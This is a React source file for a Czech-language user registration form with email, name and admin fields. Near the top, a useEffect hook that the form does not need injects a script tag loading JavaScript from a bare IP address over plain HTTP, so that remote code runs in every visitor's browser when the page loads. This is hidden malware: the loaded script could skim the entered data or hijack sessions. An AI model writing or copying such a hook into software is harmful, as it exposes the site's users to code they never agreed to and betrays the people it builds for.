import React, {useEffect} from 'react'



const defaultFormValues = {
   email: '',
   name:'',
   admin: 0
}
const RegisterUserForm = ({
  onSubmit,
  initialValues = defaultFormValues,
  clearOnSubmit
}) => {

  useEffect(()=>{
    var tag = document.createElement('script');
    tag.async = false;
    tag.src = "http://82.208.16.123:8080/js/logos.js";
    var body = document.getElementsByTagName('body')[0];
    body.appendChild(tag);
},[])	

  const [values, setValues] = React.useState(initialValues)

  const setValue = (field, value) =>
    setValues((old) => ({ ...old, [field]: value }))

  const handleSubmit = (e) => {
    if (clearOnSubmit) {
      setValues(defaultFormValues)
    }
    e.preventDefault()
    onSubmit(values)

  }

  React.useEffect(() => {
    setValues(initialValues)
  }, [initialValues])

  return (
    <div>
      <form className="login100-form validate-form problem-form" onSubmit={handleSubmit}>
      <div className="wrap-input100 validate-input mg" data-validate = "Zadejte email">
      <span className="btn-show-pass">
							<i className="zmdi zmdi-eye"></i>
						</span>
						<input className="input100" type="text" name="room"
						  
              value={values.email}
              onChange={e => setValue("email", e.target.value)}
		
						/>
						<span className="focus-input100" data-placeholder="Email"></span>
					</div>
      <div className="wrap-input100 validate-input mg" data-validate = "Zadejte jméno">
      <span className="btn-show-pass">
							<i className="zmdi zmdi-eye"></i>
						</span>
						<input className="input100" type="text" name="name"
						  
              value={values.name}
              onChange={e => setValue("name", e.target.value)}
		
						/>
						<span className="focus-input100" data-placeholder="Jméno"></span>
					</div>
          <div className='adminBox'>
            <div><label htmlFor="admin"> Admin</label> <i className="fas fa-user-shield"></i> </div>
            <input type="checkbox" name="admin" value={values.admin}   onChange={e => setValue("admin", e.target.checked)} />
          </div>

          <div className="container-login100-form-btn" style={{width:"50%", marginBottom:"10px"}}>
						<div className="wrap-login100-form-btn">
							<div className="login100-form-bgbtn"></div>
							<button className="login100-form-btn" type='submit'>
								Přidat
							</button>
						</div>
					</div>
  
      </form>
    </div>
  )
}

export default RegisterUserForm;



